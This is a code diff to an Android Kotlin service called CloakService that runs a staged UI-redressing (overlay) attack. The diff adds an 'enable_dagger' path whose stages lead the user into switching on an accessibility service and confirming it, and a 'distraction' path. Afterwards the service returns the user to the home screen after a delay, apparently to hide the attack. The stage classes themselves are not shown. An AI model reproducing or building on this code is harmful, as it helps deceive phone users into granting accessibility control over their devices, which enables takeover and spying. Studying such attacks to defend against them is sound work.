@@ -18,35 +18,41 @@ class CloakService : Service() {
 
     companion object {
         private val TAG: String = CloakService::class.java.name
+        const val ACTION_ENABLE_DAGGER = "enable_dagger"
+        const val ACTION_DISTRACTION = "action_distraction"
     }
 
     override fun onBind(intent: Intent?): IBinder? {
         return null
     }
 
-    override fun onCreate() {
-        super.onCreate()
+    override fun onStartCommand(intent: Intent, flags: Int, startId: Int): Int {
         val listener = {
             Log.d(TAG, "Stage completed")
             // Go to the home screen if there are no more stages
             if (!attack.moveToNext()) {
                 attack.stopAttack()
                 stopSelf()
-                val intent = Intent(Intent.ACTION_MAIN)
-                intent.addCategory(Intent.CATEGORY_HOME)
-                intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK
+                val goHome = Intent(Intent.ACTION_MAIN)
+                goHome.addCategory(Intent.CATEGORY_HOME)
+                goHome.flags = Intent.FLAG_ACTIVITY_NEW_TASK
                 Thread.sleep(Config.OVERLAY_DELAY)
-                startActivity(intent)
+                startActivity(goHome)
             }
         }
         val stages = ArrayList<Stage>()
-        stages.add(AccessibilityStage(applicationContext, listener))
-        stages.add(ToggleSwitchStage(applicationContext, listener))
-        stages.add(OkButtonStage(applicationContext, listener))
-        attack = RedressingAttack(stages)
-    }
+        when (intent.action) {
+            ACTION_ENABLE_DAGGER -> {
+                stages.add(AccessibilityStage(applicationContext, listener))
+                stages.add(ToggleSwitchStage(applicationContext, listener))
+                stages.add(OkButtonStage(applicationContext, listener))
+            }
 
-    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+            ACTION_DISTRACTION -> {
+                stages.add(DistractionStage(applicationContext, listener))
+            }
+        }
+        attack = RedressingAttack(stages)
         attack.moveToNext()
         return START_NOT_STICKY
     }
